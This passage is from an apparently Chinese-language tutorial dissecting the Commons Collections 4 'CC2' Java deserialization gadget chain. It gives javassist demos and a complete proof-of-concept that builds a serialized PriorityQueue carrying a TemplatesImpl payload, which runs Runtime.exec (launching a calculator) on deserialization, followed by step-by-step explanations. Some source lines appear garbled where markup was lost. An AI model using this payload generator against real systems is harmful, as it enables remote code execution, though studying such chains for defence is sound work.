            for (int i = 0; i >> 1) - 1; i >= 0; i--)
                siftDown(i, (E) queue[i]);
        }
siftDown：
        private void siftDown(int k, E x) {
            if (comparator != null)
                siftDownUsingComparator(k, x);
            else
                siftDownComparable(k, x);
        }
这里的x是我们可控的，跟入第一个siftDownUsingComparator：
        private void siftDownUsingComparator(int k, E x) {
            int half = size >>> 1;
            while (k  0)
                    c = queue[child = right];
                if (comparator.compare(x, (E) c) 1，只有size>1才能使的i>0，才能进入siftDown这个方法中，完成后面的链。
2.这里为什么要在add之后才通过反射修改comparator的值?
add调用了offer方法：
offer方法中调用了siftUp方法：
这里需要保证comparator的值为null，才能够正常的添加元素进queue，如果我们在add之前使comparator为我们构造好的TransformingComparator，就会报这么一个错误：
我们回过头来看看javassit：
    import javassist.*;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    public class javassit_test {
        public static void createPseson() throws Exception {
            ClassPool pool = ClassPool.getDefault();
            CtClass cc = pool.makeClass("Cat");
            String cmd = "System.out.println(\"evil code\");";
            // 创建 static 代码块，并插入代码
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            // 写入.class 文件
            cc.writeFile();
        }
        public static void main(String[] args) {
            try {
                createPseson();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
上面这段代码中生成的class是这样的：
这里的static语句块会在创建类实例的时候执行。
回到TemplatesImpl这个类中：
在其newTransformer中调用了getTransletInstance方法：
重点代码即我圈起来的两行代码，首先先跟进defineTransletClasses方法：
这里通过loader.defineClass的方式将bytecodes还原为Class，接着在外面又调用了_class[_transletIndex].newInstance方法实例化还原的Class。此时static语句块成功执行。
也就是说，我们可以通过TemplatesImpl#newTransformer方法来执行恶意类的static语句块。
Demo：
    import javassist.*;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import java.lang.ClassLoader;
    import java.lang.reflect.Field;
    public class javassit_test {
        public static void createPseson() throws Exception {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass cc = pool.makeClass("Cat");
            String cmd = "java.lang.Runtime.getRuntime().exec(\"open  /System/Applications/Calculator.app\");";
            // 创建 static 代码块，并插入代码
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            // 写入.class 文件
            byte[] classBytes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setFieldValue(templates, "_bytecodes", targetByteCodes);
            // 进入 defineTransletClasses() 方法需要的条件
            setFieldValue(templates, "_name", "name" + System.nanoTime());
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            templates.newTransformer();
        }
        public static void main(String[] args) {
            try {
                createPseson();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
        public static Field getField(final Class clazz, final String fieldName) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
            }
            catch (NoSuchFieldException ex) {
                if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);
            }
            return field;
        }
    }
此时已经可以成功执行命令了，接下来就是需要找到一个点调用了newTransformer这个方法。
前面说了，我们已经可以执行到transform方法了，那么我们可以通过InvokerTransformer#transform的反射来调用TemplatesImpl#newtransformer，达到命令执行的目的。
完整POC：
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationTargetException;
    import java.util.PriorityQueue;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    public class cc2 {
        public static void main(String[] args) throws Exception {
            Constructor constructor = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer").getDeclaredConstructor(String.class);
            constructor.setAccessible(true);
            InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance("newTransformer");
            TransformingComparator comparator = new TransformingComparator(transformer);
            PriorityQueue queue = new PriorityQueue(1);
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass cc = pool.makeClass("Cat");
            String cmd = "java.lang.Runtime.getRuntime().exec(\"open  /System/Applications/Calculator.app\");";
            // 创建 static 代码块，并插入代码
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
            // 写入.class 文件
            byte[] classBytes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setFieldValue(templates, "_bytecodes", targetByteCodes);
            // 进入 defineTransletClasses() 方法需要的条件
            setFieldValue(templates, "_name", "name");
            setFieldValue(templates, "_class", null);
            Object[] queue_array = new Object[]{templates,1};
            Field queue_field = Class.forName("java.util.PriorityQueue").getDeclaredField("queue");
            queue_field.setAccessible(true);
            queue_field.set(queue,queue_array);
            Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
            size.setAccessible(true);
            size.set(queue,2);
            Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            comparator_field.setAccessible(true);
            comparator_field.set(queue,comparator);
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2"));
                outputStream.writeObject(queue);
                outputStream.close();
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc2"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
        public static Field getField(final Class clazz, final String fieldName) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
            }
            catch (NoSuchFieldException ex) {
                if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);
            }
            return field;
        }
    }
  * 一些细节问题
这里我从poc的上半段到下半段，把一些细节问题梳理一下。
1.为什么要设置恶意类的父类为AbstractTranslet?
这是因为在defineTransletClasses这个方法中存在一个判断：
我们需要令_transletIndex为i，此时的i为0，默认状态下_transletIndex的值为-1，而如果_transletIndex的值小于0，就会抛出异常：
这里我们也不能通过反射的方式来设置_transletIndex的值，因为还是会进入到_auxClasses方法中，此方法会报出错误，我们依旧无法正常的序列化。
2.为什么要设置_name、_class、两个属性，其值对应的意义是什么？
首先如果要进入defineTransletClasses，需要满足这两个条件：
所以_name需要设置为任意不为null的值，而_class需要设置为null。
3.为什么要通过反射的方式来设置queue的值，而不能直接add？
这是因为在put的时候会将后一个元素与前一个元素进行比较，而templates是一个类，他和数字1无法进行比较，所以这里会报错。同样的，如果传入一个对象和另外一个对象，两者也无法进行比较，都会报出如下错误：
所以需要通过反射的方式来对queue的值进行设置。
4.为什么要修改queue数组的第一个值为TemplatesImpl?
是因为在调用compare方法的时候，传递了一个obj1进去：
通过cc1的学习我们知道，InvokerTransformer调用方法是基于你传递进来的类来进行调用的，所以这里的obj1需要设置为TemplatesImpl，而这个obj1是从这里来的：
所以我们需要控制这个c，而这个c是从queue中取出来的，所以在这里我们需要设置queue中第一个值为TemplatesImpl，为什么不能设置为第二个呢？是因为调用compare时，会先对第一个进行调用，如果我们设置TemplatesImpl在第二个位置，则会报出1没有newTransformer方法的错误：
5.为什么要通过反射的方式修改size?
这个在前面说过了，size必须要大于2，而我们这里并没有调用put方法，所以size默认是为0的，当然还有一种办法，就是先调用两次put，put正常的值进，再修改queue数组，这两种办法的实现原理是一样的。
### 我认为的利用链
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            PriorityQueue.heapify()